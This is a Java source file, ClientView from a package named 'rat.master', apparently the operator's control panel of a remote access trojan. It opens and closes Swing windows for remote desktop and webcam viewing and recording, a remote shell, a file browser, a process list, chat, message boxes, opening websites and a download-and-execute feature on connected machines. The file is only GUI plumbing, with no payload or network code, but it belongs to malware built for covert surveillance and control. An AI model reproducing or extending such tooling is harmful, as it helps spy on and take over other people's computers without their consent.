package rat.master;

import rat.master.gui.frames.*;
import rat.packets.*;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class ClientView {

    private ClientController controller;

    private RemoteDesktopScreen remoteDesktopScreen;
    private DownloadExecuteGUI downloadExecuteGUI;
    private RemoteShellGUI remoteShellGUI;
    private FileBrowserGUI fileBrowserGUI;
    private OpenWebsiteGUI openWebsiteGUI;
    private ProcessListGUI processListGUI;
    private MessageBoxGUI messageBoxGUI;
    private ChatGUI chatGUI;

    private WebcamListGUI webcamListGUI;
    private Map<Integer, RemoteWebcamGUI> remoteWebcamGUIs = new HashMap<>();

    private RemoteDesktopListGUI remoteDesktopListGUI;
    private Map<Integer, RemoteDesktopGUI> remoteDesktopGUIs = new HashMap<>();

    /* ---- */

    public void openRemoteDesktopListGUI() throws InvocationTargetException, InterruptedException {
        if (!remoteDesktopListGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                remoteDesktopListGUI = new RemoteDesktopListGUI();
                remoteDesktopListGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                remoteDesktopListGUI.setVisible(true);

                remoteDesktopListGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.stopRemoteDesktopListGUI();
                    }
                });
            });
        }
    }

    public void updateRemoteDesktopListGUI(DesktopInfoPacket packet) {
        if (remoteDesktopListGUI != null) {
            remoteDesktopListGUI.getListModel().updateRemoteDesktopList(packet.getDesktopScreenInformations());
        }
    }

    public void closeRemoteDesktopListGUI() {
        if (remoteDesktopListGUIActive()) {
            remoteDesktopListGUI.dispose();
            remoteDesktopListGUI = null;
        }
    }

    public boolean remoteDesktopListGUIActive() {
        if (remoteDesktopListGUI == null || !remoteDesktopListGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public RemoteDesktopListGUI getRemoteDesktopListGUI() {
        return remoteDesktopListGUI;
    }

    /* ---- */

    public int openRemoteDesktopGUI(String deviceName) throws InvocationTargetException, InterruptedException {
        final int[] frameId = new int[1];
        SwingUtilities.invokeAndWait(() -> {
            RemoteDesktopGUI desktopGUI = new RemoteDesktopGUI(deviceName);
            frameId[0] = desktopGUI.getFrameId();
            remoteDesktopGUIs.put(desktopGUI.getFrameId(), desktopGUI);
            desktopGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
            desktopGUI.setVisible(true);

            desktopGUI.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(WindowEvent we) {
                    controller.stopRemoteDesktopRecord(desktopGUI.getFrameId());
                    controller.stopRemoteDesktopGUI(desktopGUI.getFrameId());
                }
            });
        });

        return frameId[0];
    }

    public void updateRemoteDesktopGUI(DesktopDataPacket packet) {
        RemoteDesktopGUI desktopGUI = remoteDesktopGUIs.get(packet.getFrameId());
        if (desktopGUI != null) {
            desktopGUI.displayImagePacket(packet);
        }
    }

    public void updateRemoteDesktopJobId(DesktopInfoPacket packet) {
        int frameId = packet.getDesktopGUIId();
        int jobId = packet.getDesktopJobId();

        RemoteDesktopGUI deskopGUI = remoteDesktopGUIs.get(frameId);
        if (deskopGUI != null) {
            deskopGUI.setDesktopJobId(jobId);
        }
    }

    public RemoteDesktopGUI getRemoteDesktopGUI(int frameId) {
        return remoteDesktopGUIs.get(frameId);
    }

    public void closeRemoteDesktopGUI(int frameId) {
        RemoteDesktopGUI desktopGUI = remoteDesktopGUIs.remove(frameId);
        if (desktopGUI != null) {
            desktopGUI.dispose();
        }
    }

    /* ---- */

    public void openWebcamListGUI() throws InvocationTargetException, InterruptedException {
        if (!webcamListGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                webcamListGUI = new WebcamListGUI();
                webcamListGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                webcamListGUI.setVisible(true);

                webcamListGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.stopWebcamListGUI();
                    }
                });
            });
        }
    }

    public void updateWebcamListGUI(WebcamInfoPacket packet) {
        if (webcamListGUI != null) {
            webcamListGUI.getListModel().updateWebcamList(packet.getWebcamInformations());
        }
    }

    public void closeWebcamListGUI() {
        if (webcamListGUIActive()) {
            webcamListGUI.dispose();
            webcamListGUI = null;
        }
    }

    public boolean webcamListGUIActive() {
        if (webcamListGUI == null || !webcamListGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public WebcamListGUI getWebcamListGUI() {
        return webcamListGUI;
    }

    /* ---- */

    public int openWebcamGUI() throws InvocationTargetException, InterruptedException {
        final int[] frameId = new int[1];
        SwingUtilities.invokeAndWait(() -> {
            RemoteWebcamGUI webcamGUI = new RemoteWebcamGUI();
            frameId[0] = webcamGUI.getFrameId();
            remoteWebcamGUIs.put(webcamGUI.getFrameId(), webcamGUI);
            webcamGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
            webcamGUI.setVisible(true);

            webcamGUI.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(WindowEvent we) {
                    controller.stopWebcamRecord(webcamGUI.getFrameId());
                    controller.stopWebcamGUI(webcamGUI.getFrameId());
                }
            });
        });

        return frameId[0];
    }

    public void updateWebcamGUI(WebcamDataPacket packet) {
        RemoteWebcamGUI webcamGUI = remoteWebcamGUIs.get(packet.getFrameId());
        if (webcamGUI != null) {
            webcamGUI.displayImagePacket(packet);
        }
    }

    public void updateWebcamJobId(WebcamInfoPacket packet) {
        int frameId = packet.getWebcamGUIId();
        int jobId = packet.getWebcamJobId();

        RemoteWebcamGUI webcamGUI = remoteWebcamGUIs.get(frameId);
        if (webcamGUI != null) {
            webcamGUI.setWebcamJobId(jobId);
        }
    }

    public RemoteWebcamGUI getWebcamGUI(int frameId) {
        return remoteWebcamGUIs.get(frameId);
    }

    public void closeWebcamGUI(int frameId) {
        RemoteWebcamGUI webcamGUI = remoteWebcamGUIs.remove(frameId);
        if (webcamGUI != null) {
            webcamGUI.dispose();
        }
    }

    /* ---- */

    public void startRemoteDesktopScreenGUI() throws InvocationTargetException, InterruptedException {
        if (!remoteDesktopScreenGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                remoteDesktopScreen = new RemoteDesktopScreen();
                remoteDesktopScreen.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                remoteDesktopScreen.setVisible(true);

                remoteDesktopScreen.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.stopScreenRecord();
                    }
                });
            });
        }
    }

    public boolean remoteDesktopScreenGUIActive() {
        if (remoteDesktopScreen == null || !remoteDesktopScreen.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void updateRemoteDesktopScreenGUI(ScreenshotDataPacket packet) {
        if (remoteDesktopScreenGUIActive()) {
            remoteDesktopScreen.packetReceived(packet);
        }
    }

    public void closeRemoteDesktopScreenGUI() {
        if (remoteDesktopScreenGUIActive()) {
            remoteDesktopScreen.dispose();
            remoteDesktopScreen = null;
        }
    }

    public RemoteDesktopScreen getRemoteDesktopScreen() {
        return remoteDesktopScreen;
    }

    /* ---- */

    public void openWebsiteGUI() throws InvocationTargetException, InterruptedException {
        if (!websiteVisitGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                openWebsiteGUI = new OpenWebsiteGUI();
                openWebsiteGUI.setVisible(true);
                openWebsiteGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);

                openWebsiteGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeWebsiteGUI();
                    }
                });
            });
        }
    }

    public boolean websiteVisitGUIActive() {
        if (openWebsiteGUI == null || !openWebsiteGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeWebsiteGUI() {
        if (websiteVisitGUIActive()) {
            openWebsiteGUI.dispose();
            openWebsiteGUI = null;
        }
    }

    public OpenWebsiteGUI getOpenWebsiteGUI() {
        return openWebsiteGUI;
    }

    /* ---- */

    public void openRemoteShellGUI() throws InvocationTargetException, InterruptedException {
        if (!remoteShellGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                remoteShellGUI = new RemoteShellGUI();
                remoteShellGUI.setVisible(true);
                remoteShellGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);

                remoteShellGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeRemoteShellGUI();
                    }
                });
            });
        }
    }

    public boolean remoteShellGUIActive() {
        if (remoteShellGUI == null || !remoteShellGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeRemoteShellGUI() {
        if (remoteShellGUIActive()) {
            remoteShellGUI.dispose();
            remoteShellGUI = null;
        }
    }

    public RemoteShellGUI getRemoteShellGUI() {
        return remoteShellGUI;
    }

    /* ---- */

    public void openFileBrowserGUI() throws InvocationTargetException, InterruptedException {
        if (!fileBrowserGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                fileBrowserGUI = new FileBrowserGUI();
                fileBrowserGUI.setVisible(true);
                fileBrowserGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);

                fileBrowserGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeFileBrowserGUI();
                    }
                });
            });
        }
    }

    public boolean fileBrowserGUIActive() {
        if (fileBrowserGUI == null || !fileBrowserGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeFileBrowserGUI() {
        if (fileBrowserGUIActive()) {
            fileBrowserGUI.dispose();
            fileBrowserGUI = null;
        }
    }

    public FileBrowserGUI getFileBrowserGUI() {
        return fileBrowserGUI;
    }

    /* ---- */

    public void openProcessListGUI() throws InvocationTargetException, InterruptedException {
        if (!processListGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                processListGUI = new ProcessListGUI();
                processListGUI.setVisible(true);
                processListGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);

                processListGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeProcessListGUI();
                    }
                });
            });
        }
    }

    public boolean processListGUIActive() {
        if (processListGUI == null || !processListGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeProcessListGUI() {
        if (processListGUIActive()) {
            processListGUI.dispose();
            processListGUI = null;
        }
    }

    public ProcessListGUI getProcessListGUI() {
        return processListGUI;
    }

    /* ---- */

    public void openChatGUI() throws InvocationTargetException, InterruptedException {
        if (!chatGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                chatGUI = new ChatGUI();
                chatGUI.setVisible(true);
                chatGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                chatGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeChatGUI();
                    }
                });
            });
        }
    }

    public boolean chatGUIActive() {
        if (chatGUI == null || !chatGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeChatGUI() {
        if (chatGUIActive()) {
            chatGUI.dispose();
            chatGUI = null;
        }
    }

    public ChatGUI getChatGUI() {
        return chatGUI;
    }

    /* ---- */

    public void openMessageBoxGUI() throws InvocationTargetException, InterruptedException {
        if (!messageBoxGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                messageBoxGUI = new MessageBoxGUI();
                messageBoxGUI.setVisible(true);
                messageBoxGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                messageBoxGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent we) {
                        controller.closeMessageBoxGUI();
                    }
                });
            });
        }
    }

    public boolean messageBoxGUIActive() {
        if (messageBoxGUI == null || !messageBoxGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeMessageBoxGUI() {
        if (messageBoxGUIActive()) {
            messageBoxGUI.dispose();
            messageBoxGUI = null;
        }
    }

    public MessageBoxGUI getMessageBoxGUI() {
        return messageBoxGUI;
    }

    /* ---- */

    public void openDownloadExecuteGUI() throws InvocationTargetException, InterruptedException {
        if (!downloadExecuteGUIActive()) {
            SwingUtilities.invokeAndWait(() -> {
                downloadExecuteGUI = new DownloadExecuteGUI();
                downloadExecuteGUI.setVisible(true);
                downloadExecuteGUI.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
                downloadExecuteGUI.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent windowEvent) {
                        controller.closeDownloadExecuteGUI();
                    }
                });
            });
        }
    }

    public boolean downloadExecuteGUIActive() {
        if (downloadExecuteGUI == null || !downloadExecuteGUI.isDisplayable()) {
            return false;
        }
        return true;
    }

    public void closeDownloadExecuteGUI() {
        if (downloadExecuteGUIActive()) {
            downloadExecuteGUI.dispose();
            downloadExecuteGUI = null;
        }
    }

    public DownloadExecuteGUI getDownloadExecuteGUI() {
        return downloadExecuteGUI;
    }

    /* ---- */

    public void setController(ClientController controller) {
        this.controller = Objects.requireNonNull(controller);
    }

}
